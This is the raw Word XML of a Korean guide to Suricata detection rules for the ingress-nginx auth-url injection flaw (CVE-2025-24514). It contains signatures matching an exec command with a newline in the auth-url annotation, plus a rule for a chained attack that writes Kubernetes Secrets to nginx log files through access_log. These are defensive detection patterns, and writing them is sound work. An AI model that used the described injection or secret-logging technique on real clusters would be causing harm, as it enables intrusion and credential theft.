                      <w:proofErr w:type="spellStart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kubernetes</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd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; 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proofErr w:type="spellStart"/>
                      <w:proofErr w:type="gramStart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classtype:attempted</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd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-admin</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd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; 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sid:202524514; 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rev:1;)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맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>동작</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>원리</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">Kubernetes API </w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>서버</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>기본</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>포트</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 6443)</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>로</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>전송되는</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> TCP </w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>패킷에서</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> auth-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>값에</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> exec </w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>명령어와</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>개행</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>문자가</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>동시에</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>존재할</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>경우</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>경고</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D1A7684" w14:textId="1CDCE442" w:rsidR="00C748E6" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>탐지</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>포인트</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>|0A|(16</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>진수</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>개행</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>문자</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">), exec </w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>키워드</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>근접성</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>검사</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34C20C55" w14:textId="77777777" w:rsidR="00C748E6" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63E3A385" w14:textId="77777777" w:rsidR="00C748E6" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72AB5A6D" w14:textId="77777777" w:rsidR="00C748E6" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E730064" w14:textId="77777777" w:rsidR="00C748E6" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4CEA491D" w14:textId="77777777" w:rsidR="00C748E6" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5084D0B6" w14:textId="77777777" w:rsidR="00C748E6" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62F3FEA6" w14:textId="77777777" w:rsidR="00C748E6" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39635AA6" w14:textId="1247AE3C" w:rsidR="00C748E6" w:rsidRPr="00C748E6" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>3. 고급 탐지 시나리오</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0656E637" w14:textId="67BEE5BB" w:rsidR="00C748E6" w:rsidRPr="00C748E6" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>다단계 공격 연계 탐지 (Suricata)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4A2C523B" wp14:editId="52F0E384">
                <wp:extent cx="5422605" cy="2785730"/>
                <wp:effectExtent l="0" t="0" r="26035" b="15240"/>
                <wp:docPr id="986261614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5" cy="278573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CF305" w14:textId="7F3C91EC" w:rsidR="00C748E6" w:rsidRPr="002E1308" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
                            <w:pP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text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alert http any </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart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any</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd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 -&gt; any </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart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any</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd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 (msg:"CVE-2025-24514 Chained Attack: Secrets Exfiltration";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flow:established</w:t>
                            </w:r>
                            <w:proofErr w:type="gramEnd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,to_server</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd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;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proofErr w:type="spellStart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content:"nginx.ingress.kubernetes.io</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd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/auth-</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart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url</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd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";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content:"</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart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access_log</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd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"; distance:0;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proofErr w:type="spellStart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pcre</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd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:"/\/var\/log\/nginx\/\w+\.log/</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart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i</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd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";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proofErr w:type="spellStart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classtype:data-exfiltration</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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;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sid:202524515;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C748E6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rev:1;)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2C523B" id="_x0000_s1048" style="width:427pt;height:21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" fillcolor="white [3201]" strokecolor="black [3200]" strokeweight="1pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="258CF305" w14:textId="7F3C91EC" w:rsidR="00C748E6" w:rsidRPr="002E1308" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR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text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alert http any </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart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any</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd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 -&gt; any </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart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any</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd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 (msg:"CVE-2025-24514 Chained Attack: Secrets Exfiltration"; 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proofErr w:type="spellStart"/>
                      <w:proofErr w:type="gramStart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flow:established</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd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,to_server</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd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; 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proofErr w:type="spellStart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content:"nginx.ingress.kubernetes.io</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd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/auth-</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart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url</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd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"; 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content:"</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart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access_log</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd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"; distance:0; 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proofErr w:type="spellStart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pcre</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd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:"/\/var\/log\/nginx\/\w+\.log/</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart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i</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd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"; 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proofErr w:type="spellStart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classtype:data-exfiltration</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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; 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sid:202524515; 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C748E6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rev:1;)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맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>기능</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>access_log</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>디렉티브를</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>이용해</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> /var/log/nginx </w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>경로에</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Secrets</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>를</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>기록하는</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
